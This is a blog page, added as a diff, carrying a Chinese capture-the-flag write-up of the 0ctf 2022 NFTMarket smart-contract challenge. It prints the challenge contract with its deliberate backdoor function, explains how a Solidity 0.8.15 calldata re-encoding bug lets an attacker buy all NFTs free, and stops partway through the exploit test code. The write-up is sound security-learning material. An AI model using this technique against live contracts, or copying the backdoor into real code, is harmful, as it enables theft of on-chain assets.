@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          0ctf-2022-NFTMarket - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://thomasxu-blockchain.github.io/0ctf-2022-NFTMarket/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="../css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="../css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="../css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="../css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="../css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="../css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="../css/widget.css">
+
+
+    
+<link rel="stylesheet" href="../css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="../css/signature.css">
+
+
+    
+<link rel="stylesheet" href="../css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="../css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#杂谈" title="杂谈">杂谈</a>
+                            
+                        </div>
+                        <h1>0ctf-2022-NFTMarket</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2023-02-24
+                        </span>
+
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="0ctf-2022-NFTMarket"><a href="#0ctf-2022-NFTMarket" class="headerlink" title="0ctf-2022-NFTMarket"></a>0ctf-2022-NFTMarket</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><p>此题搬运自iczc大佬的blog，这个题的关键点在于solidity 8.16版本之前的bug。我觉得很有意思，于是在这里记录一下。</p>
+<p>而其实这个漏洞在solidity的官方blog中提到过，这给我们一个启示就是，要随时关注官方的blog。</p>
+<h2 id="题目合约"><a href="#题目合约" class="headerlink" title="题目合约"></a>题目合约</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;ERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract TctfNFT is ERC721, Ownable &#123;</span><br><span class="line">    constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123;</span><br><span class="line">        _setApprovalForAll(address(this), msg.sender, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 tokenId) external onlyOwner &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfToken is ERC20 &#123;</span><br><span class="line">    bool airdropped;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123;</span><br><span class="line">        _mint(address(this), 100000000000);</span><br><span class="line">        _mint(msg.sender, 1337);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() external &#123;</span><br><span class="line">        require(!airdropped, &quot;Already airdropped&quot;);</span><br><span class="line">        airdropped &#x3D; true;</span><br><span class="line">        _mint(msg.sender, 5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfMarket &#123;</span><br><span class="line">    event SendFlag();</span><br><span class="line">    event NFTListed(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTCanceled(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTBought(</span><br><span class="line">        address indexed buyer,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    bool tested;</span><br><span class="line">    TctfNFT public tctfNFT;</span><br><span class="line">    TctfToken public tctfToken;</span><br><span class="line">    CouponVerifierBeta public verifier;</span><br><span class="line">    Order[] orders;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        tctfToken &#x3D; new TctfToken();</span><br><span class="line">        tctfToken.approve(address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tctfNFT &#x3D; new TctfNFT();</span><br><span class="line">        tctfNFT.mint(address(tctfNFT), 1);</span><br><span class="line">        tctfNFT.mint(address(this), 2);</span><br><span class="line">        tctfNFT.mint(address(this), 3);</span><br><span class="line"></span><br><span class="line">        verifier &#x3D; new CouponVerifierBeta();</span><br><span class="line"></span><br><span class="line">        orders.push(Order(address(tctfNFT), 1, 1));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 2, 1337));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 3, 13333333337));</span><br><span class="line">        &#x2F;&#x2F;                                     100000000000</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOrder(uint256 orderId) public view returns (Order memory order) &#123;</span><br><span class="line">        require(orderId &lt; orders.length, &quot;Invalid orderId&quot;);</span><br><span class="line">        order &#x3D; orders[orderId];        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123;</span><br><span class="line">        require(price &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;);</span><br><span class="line">        orders.push(Order(nftAddress, tokenId, price));</span><br><span class="line">        emit NFTListed(msg.sender, nftAddress, tokenId, price);</span><br><span class="line">        return orders.length - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order &#x3D; getOrder(orderId);</span><br><span class="line">        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order &#x3D; getOrder(orderId);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(msg.sender, owner, order.price);</span><br><span class="line">        nft.safeTransferFrom(owner, msg.sender, order.tokenId);</span><br><span class="line">        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123;</span><br><span class="line">        Coupon memory coupon &#x3D; scoupon.coupon;</span><br><span class="line">        require(coupon.user &#x3D;&#x3D; msg.sender, &quot;Invalid user&quot;);</span><br><span class="line">        require(coupon.newprice &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        Order memory order &#x3D; getOrder(coupon.orderId);</span><br><span class="line">        _deleteOrder(coupon.orderId);</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);</span><br><span class="line">        nft.safeTransferFrom(owner, coupon.user, order.tokenId);</span><br><span class="line">        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested &#x3D; true;</span><br><span class="line">        IERC721 nft &#x3D; IERC721(nftAddress);</span><br><span class="line">        uint256 orderId &#x3D; TctfMarket(this).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(this), tokenId);</span><br><span class="line">        TctfMarket(this).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function win() external &#123;</span><br><span class="line">        require(tctfNFT.ownerOf(1) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(2) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(3) &#x3D;&#x3D; msg.sender);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123;</span><br><span class="line">        IERC721 nft &#x3D; IERC721(nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(tokenId);</span><br><span class="line">        return (spender &#x3D;&#x3D; owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) &#x3D;&#x3D; spender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deleteOrder(uint256 orderId) internal &#123;</span><br><span class="line">        orders[orderId] &#x3D; orders[orders.length - 1];</span><br><span class="line">        orders.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CouponVerifierBeta &#123;</span><br><span class="line">    TctfMarket market;</span><br><span class="line">    bool tested;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        market &#x3D; TctfMarket(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCoupon(SignedCoupon calldata scoupon) public &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested &#x3D; true;</span><br><span class="line">        Coupon memory coupon &#x3D; scoupon.coupon;</span><br><span class="line">        Signature memory sig &#x3D; scoupon.signature;</span><br><span class="line">        Order memory order &#x3D; market.getOrder(coupon.orderId);</span><br><span class="line">        bytes memory serialized &#x3D; abi.encode(</span><br><span class="line">            &quot;I, the issuer&quot;, coupon.issuer,</span><br><span class="line">            &quot;offer a special discount for&quot;, coupon.user,</span><br><span class="line">            &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice,</span><br><span class="line">            &quot;because&quot;, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        IERC721 nft &#x3D; IERC721(order.nftAddress);</span><br><span class="line">        address owner &#x3D; nft.ownerOf(order.tokenId);</span><br><span class="line">        require(coupon.issuer &#x3D;&#x3D; owner, &quot;Invalid issuer&quot;);</span><br><span class="line">        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) &#x3D;&#x3D; coupon.issuer, &quot;Invalid signature&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目逻辑还是很简单的，实现了一个简易版本的 nft market。</p>
+<p>完成题目需要获得 1， 2， 3 号nft，这些 nft 是属于题目合约的（1属于 nft 合约本身，不过不影响），并且在最开始就被放入了市场中，价格分别为1，1337，133333333337.</p>
+<p>初始状态选手只能获得5个token空投，market拥有1337个token。</p>
+<p>常理来说玩家只能购买1号nft，剩下的两个太贵了买不起。</p>
+<p>purchaseTest 属于一个后门，其逻辑如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">purchaseTest</span>(<span class="params">address nftAddress, uint256 tokenId, uint256 price</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!tested, <span class="string">"Tested"</span>);</span><br><span class="line">        tested = <span class="literal">true</span>;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        uint256 orderId = TctfMarket(<span class="keyword">this</span>).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(<span class="keyword">this</span>), tokenId);</span><br><span class="line">        TctfMarket(<span class="keyword">this</span>).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数可以让market本身进行一个新的order的构造，然后让market自己再把这个order买下来。</p>
+<p>但是问题是这个函数没有制定nft的地址，所以完全可以自己构造一个fakenft，让market买下来，这样可以最多获得1337个token，这样2号就解决了。</p>
+<p>那么1和2搞定了，如何搞定3呢？</p>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>想拿出来3，有三种方式：</p>
+<ol>
+<li>搞出来一堆erc20，但是题目合约最多就1337个，token合约虽然给自己mint了一堆，但是没有其他操作，所以不可行。</li>
+<li>改价格：1. 在交易过程中改 2. 通过coupon</li>
+<li>直接给转出来，没看到有能利用的点</li>
+</ol>
+<p>其中1和3都是不可行的，只有2是可能的。</p>
+<h3 id="如何改价格"><a href="#如何改价格" class="headerlink" title="如何改价格"></a>如何改价格</h3><p>对于在交易过程中改价格，想法是通过可控的外部调用进行重入，改变order数组的结构。</p>
+<p>对于改价格的点，有如下几个：</p>
+<ol>
+<li>safetransferFrom：没用，每次调用都是在交易末尾，重入没有意义。</li>
+<li>purchaseTest的approve：可以构造一个假的nft，重写approve逻辑进行重入，但是问题是，我们的目的是改变3的价格，对于3的order，只有其owner可以创建，那么唯一的机会就是在test里面，那么nft的地址就必须是题目的地址，那么久没法改approve进行重入。如果上来就给假的nft地址，那么这一切都毫无意义，不可行。</li>
+<li>verifyCoupon的ownerOf：由于purchaseWithCoupon 函数调用 verify 前后没有对conpon的order进行一致性校验，那么按理说我们就可以通过在verifyCoupon函数中做一些操作改变order数组结构，也就是使得签名验证和后续的购买出现偏差，使得可以低价购入3号nft。（正确思路确实要用到这里，但是并不是上述的思路）</li>
+</ol>
+<p>对于3号思路，本来想的是没问题的，但是在后面才想起来ownerOf是一个view函数，底层用的是staticcall，不能做状态改变，所以这条路也行不通。</p>
+<h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a><strong>正解</strong></h2><p>这是一个8.15以及之前版本出现的问题，详细解释见这篇文章：<a href="https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/" target="_blank" rel="noopener">https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/</a></p>
+<p>通俗来说，就是如果一个结构体中间有一个变长的结构，比如string或者bytes，那么他在第二次打包的时候会出现bug，导致结构体的第一个字段被改成0.</p>
+<p>题目中的结构体为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中SignedCoupon就是一个满足条件的可以触发bug的结构体，以为他中间的字段reason是个变长字段，第二次打包calldata，也就是传入verify的时候，他的第一个字段也就是orderId就成0了。</p>
+<blockquote>
+<p>而题目合约没有创tokenid为0的NFT，这就给了我们钻空子的机会，我们只需要mint一个tokenid为0的NFT，并把价格设为0就可以免费购入所有NFT。</p>
+</blockquote>
+<p>测试代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity  <span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[<span class="number">2</span>] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line">contract Verifier&#123;</span><br><span class="line">    address public issuer;</span><br><span class="line">    address public recovered;</span><br><span class="line">    Coupon public c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">verifyCoupon</span>(<span class="params">SignedCoupon calldata scoupon</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        Signature memory sig = scoupon.signature;</span><br><span class="line">        c=coupon; </span><br><span class="line">        Order memory order;</span><br><span class="line">        order.nftAddress = address(<span class="number">0</span>);</span><br><span class="line">   